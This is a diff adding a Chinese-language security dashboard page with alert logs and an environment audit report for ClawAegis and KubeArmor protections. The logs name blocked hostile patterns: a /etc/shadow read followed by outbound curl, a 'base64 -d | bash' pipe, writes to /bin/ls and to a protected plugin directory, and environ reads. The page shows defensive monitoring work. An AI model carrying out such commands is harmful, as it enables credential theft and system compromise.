+    <div class="log-entry" style="border-left:4px solid #ef4444">
+      <div class="log-header">
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-p0">FR-28</span>
+        <span class="badge badge-sys">ClawAegis</span>
+        <span class="log-time">2026-04-30 14:12:03</span>
+      </div>
+      <div class="log-body"><strong>沙盒逃逸</strong> — 尝试写入 ~/.openclaw/extensions/claw-aegis/ 目录</div>
+      <div class="log-detail">tool: write | path: ~/.openclaw/extensions/claw-aegis/attack.sh | reason: protected-path | action: BLOCKED</div>
+      <div class="log-chain">
+        <span class="log-chain-step">write tool</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step">protectedRoot</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+      </div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #ef4444">
+      <div class="log-header">
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-p0">FR-31</span>
+        <span class="badge badge-sys">ClawAegis</span>
+        <span class="log-time">2026-04-30 13:55:22</span>
+      </div>
+      <div class="log-body"><strong>异常外联链</strong> — 读取敏感文件后 curl 至外部域名</div>
+      <div class="log-detail">chain: read(/etc/shadow) → source:secret-reference → curl(outbound) | decision: direct-secret-exfiltration | action: BLOCKED</div>
+      <div class="log-chain">
+        <span class="log-chain-step">read(/etc/shadow)</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step">secret-reference</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step">curl(outbound)</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+      </div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #f59e0b">
+      <div class="log-header">
+        <span class="badge badge-medium">MEDIUM</span>
+        <span class="badge badge-p0">FR-31</span>
+        <span class="badge badge-sys">ClawAegis</span>
+        <span class="log-time">2026-04-30 13:40:08</span>
+      </div>
+      <div class="log-body"><strong>编码混淆命令</strong> — base64 -d | bash</div>
+      <div class="log-detail">matched: base64-pipe-exec | action: BLOCKED</div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #dc2626">
+      <div class="log-header">
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-p1">FR-32</span>
+        <span class="badge badge-sys">KubeArmor IMA</span>
+        <span class="log-time">2026-04-30 08:00:02</span>
+      </div>
+      <div class="log-body"><strong>IMA 哈希不匹配</strong> — kubearmor 二进制文件完整性校验失败</div>
+      <div class="log-detail">expected: sha256:abc123de4567... | actual: sha256:def456789012... | action: ALERT</div>
+      <div class="log-chain">
+        <span class="log-chain-step">IMA度量</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step">ProcessHash校验</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">MISMATCH</span>
+      </div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #7f1d1d">
+      <div class="log-header">
+        <span class="badge badge-blocked">BLOCKED</span>
+        <span class="badge badge-p1">FR-33</span>
+        <span class="badge badge-sys">KubeArmor</span>
+        <span class="log-time">2026-04-30 15:01:22</span>
+      </div>
+      <div class="log-body"><strong>文件防篡改</strong> — 写入 /bin/ls 被 FIM 策略阻止</div>
+      <div class="log-detail">policy: harden-file-integrity-monitoring | action: Block | tags: MITRE_T1036, NIST_SI-4</div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #f59e0b">
+      <div class="log-header">
+        <span class="badge badge-observed">DETECTED</span>
+        <span class="badge badge-p1">FR-33</span>
+        <span class="badge badge-sys">ClawAegis</span>
+        <span class="log-time">2026-04-30 14:35:18</span>
+      </div>
+      <div class="log-body"><strong>插件自保护</strong> — 尝试修改 ClawAegis 配置文件</div>
+      <div class="log-detail">tool: edit | matched: claw-aegis reference + mutation | action: BLOCKED</div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #f59e0b">
+      <div class="log-header">
+        <span class="badge badge-medium">MEDIUM</span>
+        <span class="badge badge-p0">FR-30</span>
+        <span class="badge badge-sys">KubeArmor</span>
+        <span class="log-time">2026-04-30 09:15:00</span>
+      </div>
+      <div class="log-body"><strong>基线违规</strong> — 非预期进程执行 /usr/bin/python3</div>
+      <div class="log-detail">container: nginx-proxy | operation: Process | source: /usr/bin/python3 | action: Audit</div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #3b82f6">
+      <div class="log-header">
+        <span class="badge badge-low">LOW</span>
+        <span class="badge badge-p1">FR-33</span>
+        <span class="badge badge-sys">KubeArmor</span>
+        <span class="log-time">2026-04-30 14:22:05</span>
+      </div>
+      <div class="log-body"><strong>环境变量保护</strong> — 读取 /proc/1234/environ (protectEnv 预设)</div>
+      <div class="log-detail">preset: protectEnv | action: Audit</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE 8: 环境安全审计                                -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section" id="page-audit">
+  <div class="subheader">
+    <strong>环境安全审计报告</strong>
+  </div>
+  <div class="content-area">
+
+    <div class="grid-2 mb-16">
+      <!-- Score -->
+      <div class="app-panel" style="display:flex;align-items:center;gap:24px">
+        <div class="score-circle score-med">
+          <div class="score-num">78</div>
+          <div class="score-label">/ 100</div>
+        </div>
+        <div>
+          <div style="font-size:1.1rem;font-weight:700;color:var(--text-h)">运行环境安全评分</div>
+          <div class="text-sm mt-8" style="color:var(--text)">中等风险 — 需关注 IMA 度量与文件完整性加固</div>
+          <div class="flex gap-12 mt-12">
+            <div class="stat-mini"><div class="sm-val">6</div><div class="sm-label">FR 总数</div></div>
+            <div class="stat-mini"><div class="sm-val" style="color:var(--accent)">3</div><div class="sm-label">P0 项</div></div>
+            <div class="stat-mini"><div class="sm-val" style="color:#d97706">3</div><div class="sm-label">P1 项</div></div>
+          </div>
+        </div>
+      </div>
+      <!-- Stats -->
+      <div class="app-panel">
+        <div style="font-size:1rem;font-weight:700;color:var(--text-h);margin-bottom:12px">检查项汇总</div>
+        <div class="grid-2">
+          <div class="stat-mini"><div class="sm-val" style="color:#059669">12</div><div class="sm-label">检查项通过</div></div>
+          <div class="stat-mini"><div class="sm-val" style="color:#dc2626">8</div><div class="sm-label">检查项待修复</div></div>
+        </div>
+        <div style="margin-top:16px;border-top:1px solid var(--border);padding-top:12px">
+          <div class="text-xs" style="font-weight:600;margin-bottom:8px;color:var(--text-h)">合规映射</div>
+          <div class="flex flex-wrap gap-8">
+            <span class="compliance-tag aia">AIA08 运行环境风险</span>
+            <span class="compliance-tag aia">AIA09 可追溯性失效</span>
+            <span class="compliance-tag asi">ASI05 意外代码执行</span>
+            <span class="compliance-tag asi">ASI10 智能体越权</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Per-FR Compliance Table -->
+    <div class="section-title">各 FR 合规状态</div>
+    <div class="app-panel mb-16">
+      <div class="overflow-x">
+        <table class="data-table">
+          <thead><tr><th>FR</th><th>功能</th><th>优先级</th><th>状态</th><th>检查项</th><th>通过</th><th>待修复</th></tr></thead>
+          <tbody>
+            <tr><td><strong>FR-28</strong></td><td>沙盒环境隔离</td><td><span class="badge badge-p0">P0</span></td><td><span class="badge badge-green">合规</span></td><td>4</td><td>4</td><td>0</td></tr>
+            <tr><td><strong>FR-29</strong></td><td>容器隔离与防逃逸</td><td><span class="badge badge-p0">P0</span></td><td><span class="badge badge-green">合规</span></td><td>4</td><td>4</td><td>0</td></tr>
+            <tr><td><strong>FR-30</strong></td><td>宿主机安全加固</td><td><span class="badge badge-p1">P1</span></td><td><span class="badge badge-observe">部分合规</span></td><td>4</td><td>2</td><td>2</td></tr>
+            <tr><td><strong>FR-31</strong></td><td>主机异常行为检测</td><td><span class="badge badge-p0">P0</span></td><td><span class="badge badge-green">合规</span></td><td>4</td><td>4</td><td>0</td></tr>
+            <tr><td><strong>FR-32</strong></td><td>可信启动与完整性</td><td><span class="badge badge-p1">P1</span></td><td><span class="badge" style="background:#fef2f2;color:#dc2626">不合规</span></td><td>4</td><td>0</td><td>4</td></tr>
+            <tr><td><strong>FR-33</strong></td><td>关键文件防篡改</td><td><span class="badge badge-p1">P1</span></td><td><span class="badge badge-observe">部分合规</span></td><td>4</td><td>2</td><td>2</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Detailed Check Items -->
+    <div class="section-title">详细检查项</div>
+    <div class="app-panel mb-16">
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-28: 沙盒文件系统隔离</div><div class="ci-desc">ClawAegis protectedRoots 配置正确，工作区外写入已阻断</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-28: 沙盒网络隔离</div><div class="ci-desc">exfiltrationGuard 链式检测启用，出站请求受控</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-29: 容器 AppArmor 策略</div><div class="ci-desc">KubeArmor AppArmor 策略已部署，readOnly 目录生效</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-29: 容器逃逸防护</div><div class="ci-desc">特权容器 mount/ptrace 系统调用已通过 eBPF 监控</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon warn">!</div>
+        <div class="check-info"><div class="ci-title">FR-30: 宿主机安全基线</div><div class="ci-desc">部分 harden 策略 (cronjob/impair-defense) 仍为 Audit 模式，建议切换为 Block</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon warn">!</div>
+        <div class="check-info"><div class="ci-title">FR-30: 宿主机内核参数</div><div class="ci-desc">部分节点未启用 apparmor LSM，需检查内核启动参数</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-31: 高风险命令检测</div><div class="ci-desc">ClawAegis 16 条 HIGH_RISK_COMMAND_PATTERNS + 14 条混淆检测全部启用</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-31: 反弹Shell检测</div><div class="ci-desc">KubeArmor tcp_connect/inet_csk_accept/udp_sendmsg kprobe 已加载</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail">✗</div>
+        <div class="check-info"><div class="ci-title">FR-32: IMA 度量启用</div><div class="ci-desc">KubeArmor enableIMA 默认关闭，需 BPF LSM 支持后启用</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail">✗</div>
+        <div class="check-info"><div class="ci-title">FR-32: KSecure IMA 实现</div><div class="ci-desc">KSecure IMA 度量尚未实现，需添加 integrity LSM 内核参数</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail">✗</div>
+        <div class="check-info"><div class="ci-title">FR-32: 完整性校验告警</div><div class="ci-desc">kubearmor 二进制哈希不匹配告警后无自动响应机制</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail">✗</div>
+        <div class="check-info"><div class="ci-title">FR-32: 度量清单完整性</div><div class="ci-desc">部分组件 (OpenClaw) 哈希基线未建立</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-33: FIM 策略部署</div><div class="ci-desc">KubeArmor FIM + harden 策略已部署，/bin/ /boot/ /sbin/ /usr/ readOnly 生效</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon warn">!</div>
+        <div class="check-info"><div class="ci-title">FR-33: /etc/ 保护级别</div><div class="ci-desc">harden-write-etc-dir 为 Block，但 cron/apparmor 目录仍为 Audit</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon pass">✓</div>
+        <div class="check-info"><div class="ci-title">FR-33: ClawAegis 自保护</div><div class="ci-desc">self-integrity 启动校验 + 5 类文本违规检测 + config revision 追踪已启用</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon warn">!</div>
+        <div class="check-info"><div class="ci-title">FR-33: KSecure 回滚能力</div><div class="ci-desc">rollback 数据目录存在但仅覆盖 3 个关键文件，建议扩展</div></div>
+      </div>
+    </div>
+
+    <!-- Priority Remediation -->
+    <div class="section-title">优先修复建议</div>
+    <div class="app-panel">
+      <div class="check-item">
+        <div class="check-icon fail" style="background:#7f1d1d;color:#fff">1</div>
+        <div class="check-info"><div class="ci-title">[FR-32] 启用 KubeArmor IMA 度量</div><div class="ci-desc">在支持 BPF LSM 的节点上设置 enableIMA=true，通过 ConfigMap 或命令行参数 --enableIMA 启用。IMA 度量对运行环境完整性验证至关重要。</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail" style="background:#7f1d1d;color:#fff">2</div>
+        <div class="check-info"><div class="ci-title">[FR-32] 为 KSecure 添加 IMA 支持</div><div class="ci-desc">在 KSecure 节点内核参数中添加 lsm=integrity,selinux,apparmor,bpf，实现 IMA 度量策略和运行时完整性校验。</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail" style="background:#ef4444;color:#fff">3</div>
+        <div class="check-info"><div class="ci-title">[FR-32] 建立完整性校验自动响应</div><div class="ci-desc">当 IMA 哈希不匹配时，应自动触发告警升级、容器隔离或自动回滚机制，避免仅记录告警。</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon fail" style="background:#ef4444;color:#fff">4</div>
+        <div class="check-info"><div class="ci-title">[FR-32] 补全度量清单基线</div><div class="ci-desc">为 OpenClaw core runtime、ClawManager frontend assets 等组件建立 SHA-256 基线哈希。</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon warn" style="background:#d97706;color:#fff">5</div>
+        <div class="check-info"><div class="ci-title">[FR-30/33] 升级 harden 策略为 Block 模式</div><div class="ci-desc">将 harden-cronjob-cfg、harden-impair-defense 从 Audit 升级为 Block，确保 cron 和安全工具配置不可被篡改。</div></div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon warn" style="background:#d97706;color:#fff">6</div>
+        <div class="check-info"><div class="ci-title">[FR-33] 扩展 KSecure 回滚覆盖范围</div><div class="ci-desc">在 /opt/KSec/compliance/rollback/ 中增加更多关键配置文件备份 (如 /etc/ssh/sshd_config, /etc/pam.d/*)。</div></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+</div><!-- /main-content -->
+</div><!-- /app-shell -->
+
+<script>
+// ─── Sidebar Navigation ───
+document.querySelectorAll('.nav-item').forEach(item => {
+  item.addEventListener('click', () => {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    item.classList.add('active');
+    const page = item.dataset.page;
+    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
+    const target = document.getElementById('page-' + page);
+    if (target) target.classList.add('active');
+  });
+});
+
+// ─── Tab Switching ───
+document.querySelectorAll('.tabs').forEach(tabGroup => {
+  const groupName = tabGroup.dataset.tabgroup;
+  tabGroup.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabGroup.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      const tabId = tab.dataset.tab;
+      // Find sibling tab-contents
+      const contentArea = tabGroup.closest('.content-area') || tabGroup.parentElement;
+      contentArea.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+      const target = document.getElementById(tabId);
+      if (target) target.classList.add('active');
+    });
+  });
+});
+
+// ─── Toggle Switches ───
+document.querySelectorAll('.toggle-switch').forEach(toggle => {
+  toggle.addEventListener('click', () => {
+    toggle.classList.toggle('on');
+  });
+});
+</script>
+
+</body>
+</html>
